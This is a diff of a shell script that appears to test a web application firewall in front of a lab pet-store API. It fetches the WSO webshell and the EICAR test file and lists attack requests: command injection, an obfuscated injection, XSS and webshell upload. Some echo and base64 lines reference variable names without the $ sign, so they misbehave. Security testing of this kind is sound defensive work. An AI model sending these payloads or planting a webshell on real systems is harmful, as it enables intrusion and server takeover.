@@ -7,19 +7,28 @@ PETSTORE_URL='http://petstore.corp.fabriclab.ca/api/v3'
 wso_file="wso.php"
 wso_url="https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php"
 if [ ! -f "$wso_file" ]; then
-    curl -O $wso_url
+    curl -sO $wso_url
 fi
 
 # eicar.txt is a Anti-Virus Test File
 eicar_file="eicar.com.txt"
 eicar_url="https://secure.eicar.org/eicar.com.txt"
 if [ ! -f "$eicar_file" ]; then
-    curl -O $eicar_url
+    curl -sO $eicar_url
 fi
 
 # Encode base64
 WSO_B64=$(base64 -w 0 wso_file)
 EICAR_B64=$(base64 -w 0 eicar_file)
+
+echo ""
+echo ""
+echo WSO_B64
+echo ""
+echo ""
+echo EICAR_B64
+echo ""
+echo ""
 
 RED='\033[0;31m' # Red color code
 GREEN='\033[0;32m' # Green color code
@@ -37,10 +46,10 @@ options=(
     "POST {\"status\": \"/bin/ls\"}                            - Command Injection in JSON"
     "POST {\"status\": \"xx& var1=l var2=s;$var1$var2\"}                 - Zero-Day in JSON"
     "POST {\"status\": \"<script>alert(123)</script>\"}       - XSS in JSON"
-    "POST file=@wso.php                         - Upload a Webshell"
-    "POST file=@eicar.com.txt                         - Upload Eicar test file"
+    "POST file=@wso.php                                   - Upload a Webshell"
+    "POST file=@eicar.com.txt                             - Upload Eicar test file"
     "POST {\"status\": \"*wso.php*\"}                         - Webshell in JSON"
-    "POST {\"status\": \"*eicar.com.txt*\"}                         - Eicar in JSON"
+    "POST {\"status\": \"*eicar.com.txt*\"}                   - Eicar in JSON"
     "GET findByStatus?status=sold&status=pending          - Additional URL parameter"
     "GET accept: application/yaml                         - Non JSON request"
 )
